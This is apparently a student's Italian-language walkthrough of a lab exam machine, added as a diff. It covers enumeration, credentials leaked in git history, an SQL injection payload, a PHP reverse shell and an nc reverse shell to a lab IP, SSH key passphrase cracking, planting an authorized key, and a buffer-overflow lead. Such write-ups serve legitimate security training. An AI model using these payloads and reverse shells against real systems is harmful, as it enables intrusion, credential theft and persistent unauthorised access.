@@ -1,0 +1,87 @@
+Test Esame 1 appello:
+
+Trovato l'IP della macchina, utilizzo nmap 
+nmap -sCV 172.16.164.129
+
+Vedo che c'è un server HTTP sulla porta 80 e uno HTTPS sulla porta 443
+
+| ssl-cert: Subject: commonName=void.vdsi/organizationName=vdsi/stateOrProvinceName=Rome/countryName=IT
+
+vedendo questa linea, capisco che l'hostname è void.vdsi. Lo aggiungo a hosts.
+Comment this item
+provo a enumerare le directory:
+gobuster dir -u void.vdsi -w /usr/share/wordlists/dirb/common.txt -x php,txt,tar -t 20 
+
+ma non trovo nulla...
+
+provo a enumerare i vhost:
+gobuster vhost -u void.vdsi -w /usr/share/wordlists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
+
+trovo dev.void.vdsi e lo aggiungo a hosts.
+
+faccio lo scan delle directory e file. Trovo admin che chiede credenziali, e trovo anche git. provo a scaricare la repo con git-dumper
+
+facendo git log, vedo la lista dei commit fatti nella repo. vedo che in un commit c'era la password in plaintext!
+
+utilizzando il comando " git show 0ec127b17d09565994beb216aa1c3eca797e96fc "
+vedo che le credenziali per l'accesso http sono developer:password1
+
+ora posso arrivare a login.php . dal codice sorgente scaricato dalla repo vedo che è vulnerabile a SQL Injection.
+
+provo a mettere ' in username, e ottengo un errore. SQL Injection it is!
+
+Injection riuscita!! payload:
+
+1') UNION SELECT id, username, password FROM db_void.users LIMIT 1; #
+
+ora mi trovo in una pagina che esegue PHP. Easy... creo una semplice reverse shell con revshell.io
+
+utilizzo:
+$sock = fsockopen("172.16.164.1",1337);
+$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+
+Ho una shell!!
+
+già che ci sono faccio 'python3 -c 'import pty; pty.spawn("/bin/bash")''
+
+dal file developer notes capisco che devo usare knock per abilitare ssh.
+
+controllo il file knockd.conf e vedo che la sequenza è 300,150,600
+
+dal mio host faccio
+knock -v 172.16.164.130 300 150 600
+
+ora ssh dovrebbe essere abilitato. uso la chiave olivia_ssh_key per connettermi:
+ssh olivia@172.16.164.130 -i key
+
+mi chiede una passphrase... uso ssh2john per ottenerne l'hash:
+ssh2john key > hash
+
+ora posso usare john per crackare l'hash:
+john hash
+
+la password trovata è qwerty! la provo...BINGO! sono in olivia.
+
+dopo tante ricerche noto che c'è la porta 3000 aperta...
+
+faccio wget 127.0.0.1:3000 e ottengo un file html che mi spiega il funzionamento della webapp. Posso eseguire comandi!
+
+facendo curl 127.0.0.1:3000/status?check=whoami vedo che eseguo comandi come phil.
+
+ottengo una revshell e la mando con curl:
+curl 127.0.0.1:3000/status?check=nc%20-c%20sh%20172.16.164.1%201337
+
+bene. sono phil!
+
+visto che ho accesso alla sua cartella ssh, aggiungo la mia chiave alle chiavi autorizzate così accedo via ssh e mi trovo più comodo.
+
+nella cartella home di phil trovo l'eseguibile sendmsg, che mi chiede una password. faccio strings per vedere se magari la trovo e voilà, la password è StrongPsw. 
+
+trasferisco sendmsg sul mio pc, per analizzarlo un po'. Sicuramente ci sarà un buffer overflow da fare!
+
+uso ghidra per capire cosa fa più o meno il programma.
+vedo che c'è un array da 136 byte, e che viene utilizzata fgets per metterci dentro quello che scrivo, ma senza controllare eventuali overflow. yeah!
+
+GOT EM! allego programma py
+
+
